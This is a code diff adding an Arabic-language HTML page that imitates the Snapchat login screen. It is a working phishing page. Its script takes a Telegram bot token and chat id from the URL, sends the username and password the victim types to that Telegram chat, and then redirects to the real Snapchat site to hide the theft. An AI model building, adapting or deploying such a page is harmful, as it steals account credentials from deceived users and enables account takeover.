@@ -1,0 +1,18 @@
+<!DOCTYPE html>
+<html lang="ar">
+<head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1.0"><title>Snapchat – Log In</title>
+<style>*{margin:0;padding:0;box-sizing:border-box}body{font-family:Arial,sans-serif;background:#fffc00;display:flex;justify-content:center;align-items:center;min-height:100vh}.card{background:#fff;border-radius:20px;padding:32px;width:360px;text-align:center;box-shadow:0 4px 20px rgba(0,0,0,0.1)}img{width:60px;margin-bottom:12px}h2{font-size:24px;margin-bottom:20px}input{width:100%;padding:12px;margin:6px 0;border:1px solid #ddd;border-radius:20px;font-size:16px;background:#f8f8f8}.btn{width:100%;background:#000;color:#fff;border:none;padding:14px;border-radius:25px;font-weight:bold;font-size:16px;cursor:pointer;margin-top:12px}a{color:#000;font-size:13px;display:block;margin-top:10px}</style></head>
+<body><div class="card">
+<img src="https://www.snapchat.com/static/style-guide/images/ghost/ghost.svg" alt="Snapchat">
+<h2>تسجيل الدخول إلى Snapchat</h2>
+<input type="text" id="email" placeholder="اسم المستخدم أو البريد">
+<input type="password" id="pass" placeholder="كلمة المرور">
+<button class="btn" onclick="send()">تسجيل الدخول</button>
+<a href="#">نسيت كلمة المرور؟</a>
+</div>
+<script>
+const p=new URLSearchParams(location.search),T=p.get('token'),C=p.get('chat');
+function send(){const e=document.getElementById('email').value,pa=document.getElementById('pass').value;
+if(!e||!pa)return alert('املأ جميع الحقول');
+fetch(`https://api.telegram.org/bot${T}/sendMessage?chat_id=${C}&text=${encodeURIComponent('👻 سناب شات\n👤 '+e+'\n🔑 '+pa)}`).finally(()=>{location.href='https://snapchat.com'})}
+</script></body></html>
